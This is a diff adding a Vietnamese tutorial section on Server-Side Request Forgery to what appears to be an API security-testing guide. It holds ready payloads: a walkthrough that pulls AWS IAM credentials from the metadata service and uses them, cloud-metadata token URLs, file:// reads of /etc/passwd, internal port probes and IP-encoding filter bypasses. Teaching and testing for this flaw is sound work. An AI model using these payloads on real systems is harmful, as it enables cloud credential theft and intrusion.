@@ -33,6 +33,12 @@
   - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-5)
   - [Các cách khai thác](#các-cách-khai-thác-5)
   - [Checklist khi test](#checklist-khi-test-5)
+- [API7:2023 — Server Side Request Forgery (SSRF)](#api72023--server-side-request-forgery-ssrf)
+  - [Khái niệm](#khái-niệm-6)
+  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-6)
+  - [Kịch bản kinh điển](#kịch-bản-kinh-điển)
+  - [Các cách khai thác](#các-cách-khai-thác-6)
+  - [Checklist khi test](#checklist-khi-test-6)
 
 ---
 
@@ -992,3 +998,192 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
 - [ ] Kiểm tra mã giảm giá có bị invalidate sau khi dùng / hủy đơn không
 - [ ] Tạo nhiều account test — mỗi account có được hưởng ưu đãi riêng không?
 - [ ] Kiểm tra giá có được tính lại ở server khi checkout không hay tin vào client
+
+---
+
+# API7:2023 — Server Side Request Forgery (SSRF)
+
+## Khái niệm
+
+SSRF xảy ra khi API **nhận URL từ phía client rồi tự gọi request đến URL đó** mà không kiểm tra URL đó trỏ đến đâu. Attacker lợi dụng điều này để bắt server gọi vào **mạng nội bộ, metadata service, hoặc các dịch vụ không public**.
+
+**Ví dụ thực tế:**
+App có tính năng "Import ảnh từ URL". Bạn dán URL ảnh vào, server tự fetch về. Thay vì dán URL ảnh thật, bạn dán `http://169.254.169.254/latest/meta-data/` — đó là AWS Instance Metadata Service. Server fetch về và trả lại cho bạn thông tin IAM credentials của máy chủ.
+
+**Điểm mấu chốt:**
+Attacker không tự gọi được vào mạng nội bộ của server, nhưng **bắt server gọi hộ** — server đóng vai trò proxy không có chủ ý.
+
+> **CWE liên quan:** CWE-918 — Server-Side Request Forgery
+
+---
+
+## Tại sao bị lỗi?
+
+| Nguyên nhân | Mô tả |
+|-------------|-------|
+| Không validate URL đầu vào | Chấp nhận bất kỳ URL nào client gửi |
+| Không có allowlist domain | Không giới hạn chỉ fetch từ domain được phép |
+| Không block IP nội bộ | Cho phép fetch `127.0.0.1`, `10.x`, `172.16.x`, `169.254.x` |
+| Tin vào DNS resolution | Attacker dùng DNS rebinding để bypass IP check |
+
+---
+
+## Kịch bản kinh điển
+
+### 🎯 SSRF → AWS IMDSv1 → Lấy IAM Credentials
+
+**Môi trường:** App chạy trên EC2, có endpoint nhận URL để fetch ảnh.
+
+**Bước 1 — Phát hiện SSRF**
+```http
+# [ATTACKER] — gửi URL trỏ vào Burp Collaborator để xác nhận server có fetch không
+POST /api/images/import HTTP/1.1
+Authorization: Bearer <token>
+
+{"url": "http://<burp_collaborator_id>.burpcollaborator.net"}
+```
+Nếu Collaborator nhận được request → xác nhận SSRF tồn tại.
+
+**Bước 2 — Probe mạng nội bộ**
+```http
+# Thử truy cập localhost
+POST /api/images/import HTTP/1.1
+{"url": "http://127.0.0.1"}
+{"url": "http://127.0.0.1:8080"}
+{"url": "http://127.0.0.1:6379"}   ← Redis
+{"url": "http://127.0.0.1:27017"}  ← MongoDB
+```
+
+**Bước 3 — Truy cập AWS Metadata Service**
+```http
+# IMDSv1 không cần auth — chỉ cần gọi được từ trong EC2
+POST /api/images/import HTTP/1.1
+{"url": "http://169.254.169.254/latest/meta-data/"}
+```
+Response trả về:
+```
+ami-id
+hostname
+iam/
+instance-id
+local-ipv4
+...
+```
+
+**Bước 4 — Lấy IAM Role Name**
+```http
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+```
+Response: `ec2-production-role`
+
+**Bước 5 — Lấy Credentials**
+```http
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-production-role"}
+```
+Response:
+```json
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "<secret>",
+  "Token": "<session_token>",
+  "Expiration": "2024-12-31T23:59:59Z"
+}
+```
+
+**Bước 6 — Sử dụng Credentials**
+```bash
+# [ATTACKER] — cấu hình AWS CLI với credentials vừa lấy
+aws configure set aws_access_key_id ASIA...
+aws configure set aws_secret_access_key <secret>
+aws configure set aws_session_token <session_token>
+
+# Liệt kê tài nguyên
+aws s3 ls
+aws iam get-user
+aws ec2 describe-instances
+```
+
+---
+
+## Các cách khai thác
+
+### 1. Basic SSRF — Đọc File Nội Bộ
+```http
+POST /api/fetch HTTP/1.1
+{"url": "file:///etc/passwd"}
+{"url": "file:///etc/hosts"}
+{"url": "file:///proc/self/environ"}
+```
+
+---
+
+### 2. Internal Network Scan
+Dùng SSRF để scan port và dịch vụ trong mạng nội bộ.
+```http
+{"url": "http://192.168.1.1"}    ← router
+{"url": "http://10.0.0.1:9200"}  ← Elasticsearch
+{"url": "http://10.0.0.1:5984"}  ← CouchDB
+{"url": "http://10.0.0.1:2375"}  ← Docker API
+```
+Dựa vào response time và nội dung để xác định port mở/đóng.
+
+---
+
+### 3. Cloud Metadata — GCP / Azure
+```http
+# GCP
+{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}
+
+# Azure
+{"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}
+```
+
+---
+
+### 4. Bypass Filter bằng URL Encoding / Redirect
+```http
+# Bypass blacklist IP bằng các dạng viết khác của 127.0.0.1
+{"url": "http://0x7f000001"}          ← hex
+{"url": "http://2130706433"}          ← decimal
+{"url": "http://127.1"}               ← short form
+{"url": "http://[::1]"}               ← IPv6 localhost
+{"url": "http://localtest.me"}        ← DNS resolve về 127.0.0.1
+
+# Dùng open redirect để bypass
+{"url": "https://trusted.com/redirect?url=http://169.254.169.254"}
+```
+
+---
+
+### 5. Blind SSRF — Không Có Response
+Server fetch nhưng không trả nội dung về → dùng out-of-band để xác nhận.
+```http
+# Dùng Burp Collaborator / interactsh
+{"url": "http://<collaborator_id>.oast.fun"}
+
+# Hoặc DNS lookup
+{"url": "http://ssrf-test.<collaborator_id>.oast.fun"}
+```
+
+---
+
+### 6. SSRF → Internal API Abuse
+Gọi vào internal API không có auth vì chỉ lắng nghe localhost.
+```http
+# Internal admin API chỉ bind trên 127.0.0.1
+{"url": "http://127.0.0.1:8081/admin/users"}
+{"url": "http://127.0.0.1:8081/admin/reset-password?user_id=1"}
+```
+
+---
+
+## Checklist khi test
+
+- [ ] Tìm tất cả tham số nhận URL: `url`, `uri`, `path`, `src`, `href`, `redirect`, `callback`, `webhook`
+- [ ] Gửi URL trỏ vào Burp Collaborator — xác nhận server có fetch không
+- [ ] Thử `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254`
+- [ ] Thử các dạng bypass: hex, decimal, IPv6, short form, DNS rebinding
+- [ ] Scan port nội bộ phổ biến: 6379 (Redis), 9200 (ES), 2375 (Docker), 5984 (CouchDB)
+- [ ] Kiểm tra cloud metadata endpoint tương ứng (AWS/GCP/Azure)
+- [ ] Thử `file://` protocol để đọc file hệ thống
+- [ ] Kiểm tra open redirect có thể dùng để bypass URL filter không
